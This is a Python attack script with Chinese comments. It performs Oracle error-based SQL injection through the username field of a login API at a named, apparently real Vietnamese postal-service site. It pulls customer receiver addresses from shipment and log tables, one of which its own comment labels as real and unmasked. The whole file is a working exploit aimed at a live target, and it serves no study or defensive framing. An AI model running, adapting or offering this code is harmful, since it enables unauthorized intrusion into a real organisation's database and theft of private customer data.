#!/usr/bin/env python3
"""
快速查询地址样本
"""

import requests
import json
import time

class QuickAddressCheck:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def get_samples(self):
        print("=" * 80)
        print("📍 快速地址样本查询")
        print("=" * 80)
        
        date = '20251010'
        
        # SHIPMENT表样本（3条）
        print("\n【SHIPMENT表地址样本】")
        for i in range(1, 4):
            print(f"\n样本{i}:")
            
            query = f"SELECT RECEIVER_ADDRESS FROM (SELECT RECEIVER_ADDRESS, ROWNUM AS RN FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}') WHERE RN={i}"
            addr = self.extract_via_error(query)
            if addr:
                print(f"  地址: {addr}")
            time.sleep(2)
        
        # E1E2_PH表样本（3条）
        print("\n\n【E1E2_PH表地址样本】")
        for i in range(1, 4):
            print(f"\n样本{i}:")
            
            query = f"SELECT DIACHI FROM (SELECT DIACHI, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIACHI IS NOT NULL) WHERE RN={i}"
            addr = self.extract_via_error(query)
            if addr:
                print(f"  地址: {addr}")
            time.sleep(2)
        
        # TEMP_DATA2_LOG真实地址（3条）
        print("\n\n【TEMP_DATA2_LOG真实地址样本（未脱敏）】")
        test_mabcs = ['701000', '236160', '700916']
        
        for mabc in test_mabcs:
            print(f"\nMABC={mabc}:")
            
            query = f"SELECT DIACHI FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            addr = self.extract_via_error(query)
            if addr and addr != 'NULL':
                print(f"  真实地址: {addr}")
            time.sleep(2)
        
        print("\n" + "=" * 80)
        print("✅ 完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    checker = QuickAddressCheck(target_url)
    checker.get_samples()
